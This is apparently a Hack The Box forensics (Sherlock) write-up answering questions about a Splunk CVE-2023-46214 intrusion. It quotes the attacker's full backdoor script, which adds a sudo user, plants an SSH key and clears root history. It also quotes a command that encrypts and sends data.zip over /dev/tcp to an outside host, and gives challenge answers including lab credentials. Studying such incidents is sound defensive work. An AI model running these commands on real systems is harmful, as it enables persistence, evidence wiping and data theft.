# Fragility

Hack the Box Link: [Fragility](https://app.hackthebox.com/sherlocks/Fragility)

1. What CVE did the attacker use to exploit the vulnerability?
* *Answer*: CVE-2023-46214
* Looked up one of the suspicious paths to find it here: https://blog.hrncirik.net/cve-2023-46214-analysis
2. What MITRE technique does the attacker use to maintain persistence?
* *Answer*: T1136
* Within the pcap, there is an adduser command that is run using the CVE with: 
	```#!/bin/bash&#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx&#10;access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)&#10;echo &quot;nginx:$access&quot; | chpasswd&#10;usermod -aG sudo nginx&#10;mkdir /var/www/.ssh&#10;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org&quot; &gt; /var/www/.ssh/authorized_keys&#10;chown -R nginx:nginx /var/www/&#10;cat /dev/null &gt; /root/.bash_history```
3. John has adjusted the timezone but hasn't rebooted the computer yet, which has led to some things either being updated or not updated with the new timezone. Identifying the timezone can assist you further in your investigation. What was the default timezone and the timezone after John's adjustment on this machine?
* *Answer*:utc-07/utc+07
* Looking at /var/log/syslog, you can see the systemd-timedata updates```
Apr 13 23:24:56 ubuntu systemd-timedated[5828]: Changed time zone to 'Asia/Ho_Chi_Minh' (+07).
Apr 13 23:25:26 ubuntu systemd[1]: systemd-timedated.service: Succeeded.
```
4. When did the attacker SSH in? (UTC)
* *Answer*: 04-14 15:00:21
* Looking at the pcap, find the logs where the attacker utilizes SSHv2 with the various handshakes, key exchanges, and other data related to SSH. Time can be found in the Frame portion of the packets. 
5. How much time has passed from when the user was first created to when the attacker stopped using SSH?
* *Answer*: 00:02:55 
* 15:03:08 was last time, user created at 15:00:12. Looked at times within the Frames for user creation with the CVE and the last ACK from SSH. 
6. What is the password for the account that the attacker used to backdoor?
* *Answer*: f8287ec2-3f9a-4a39-9076-36546ebb6a93
* Copy and paste the ```access``` variable from the second question into a terminal 
7. There is a secret in the exfiltrated file, what is its content?
* *Answer*: [Never able to answer]
* There was, in the bash history, the following ```sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080```. With the date being ```1713106812``` 
8. What are the username and password that the attacker uses to access Splunk?
* *Answer*:johnnyC:h3Re15j0hnNy
* Look for the HTTP POST request for the Splunk login URI within the packet capture. The username and password are included! 